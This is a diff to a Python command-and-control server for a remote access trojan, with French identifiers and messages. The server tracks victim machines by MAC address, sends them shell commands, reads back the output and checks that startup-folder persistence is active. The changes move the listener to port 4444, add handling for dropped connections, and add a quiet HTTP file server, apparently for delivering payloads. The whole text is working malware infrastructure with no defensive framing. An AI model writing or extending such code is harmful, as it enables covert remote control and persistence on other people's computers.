@@ -6,6 +6,8 @@ import signal
 import ctypes
 import inspect
 import json
+import http.server
+import socketserver
 
 tid_clients = {}
 pathDb = "./clients/"
@@ -44,6 +46,11 @@ class Threads:
         if "Run" in fonction:
             thread = threading.Thread(target=s.run, name=fonction)
             thread.start()
+
+        if "StartHttp" in fonction:
+            thread = threading.Thread(target=s.StartHttp, name=fonction)
+            thread.start()
+
         if "Client" in fonction:
             thread = threading.Thread(target=s.Threaded_client, name=fonction, args=(arg1, arg2, arg3))
             thread.start()
@@ -204,7 +211,7 @@ def AfficherClients(path):
 class Server:
 
     host = '127.0.0.1'
-    port = 1233
+    port = 4444
     BUFFER_SIZE = 1024 * 128
     ThreadCount = 0
     current_sessions = 0
@@ -258,6 +265,7 @@ class Server:
             print("Client existe deja, num par defaut : " + str(id_conn))
             id_conn = DefinirIdConn(mac_address)
             print("Nouveau id : " + str(id_conn))
+        exit = False
         while True:
         #print(str(connection.__getstate__))
             self.stopClient
@@ -281,8 +289,24 @@ class Server:
                                     #print("Fermeture de la session : " + str(id_conn))
                                     break
                                 else:
-                                    connection.sendall(str.encode(cmd))
-                                    output = connection.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+                                    try:
+                                        connection.sendall(str.encode(cmd))
+                                    except socket.error as e:
+                                        print(str(e))
+                                        self.local = True
+                                        self.ordre = ""
+                                        self.current_sessions = 0
+                                        exit = True
+                                        break
+                                    try:
+                                        output = connection.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+                                    except socket.error as e:
+                                        print(str(e))
+                                        self.local = True
+                                        self.ordre = ""
+                                        self.current_sessions = 0
+                                        exit = True
+                                        break
                                     results, pwd = output.split(self.SEPARATOR)
                                     if "Persistance via dossier startup activé" in results:
                                         print("Persistance correctement activé")
@@ -293,6 +317,8 @@ class Server:
                                     print(results)
                             #else:
                                 ##print("egale a rien")
+            if exit:
+                break
 
     def Prompt(self):
         while True:
@@ -314,7 +340,25 @@ class Server:
                         self.ordre = ""
                         lcmd = ""
                         self.local = False
-        
+
+    def StartHttp(self):
+        ADDR = self.host
+        PORT = (self.port + 1)
+        print(ADDR +" " + str(PORT))
+        DIRECTORY = "./http/"
+        if not os.path.exists("./http/"):
+            os.makedirs("./http/")
+
+        class Handler(http.server.SimpleHTTPRequestHandler):
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, directory=DIRECTORY, **kwargs)
+            def log_message(self, format, *args):
+                pass
+
+        with socketserver.TCPServer(("", PORT), Handler) as httpd:
+            print("serving at port", PORT)
+            httpd.serve_forever()
+
 
     def LaunchThread(self, fonction, arg1 = "", arg2 = "", arg3 = ""):
         print(fonction)
@@ -332,9 +376,11 @@ if os.path.exists(pathDb) != True:
 s = Server()
 #s.run()
 listen_service = s.LaunchThread("Run")
+http_service = s.LaunchThread("StartHttp")
 time.sleep(1)
 s.Prompt()
 listen_service.StopThread()
+http_service.StopThread()
 #StopAllClients()
 #p.StopThread()
 os._exit(0)
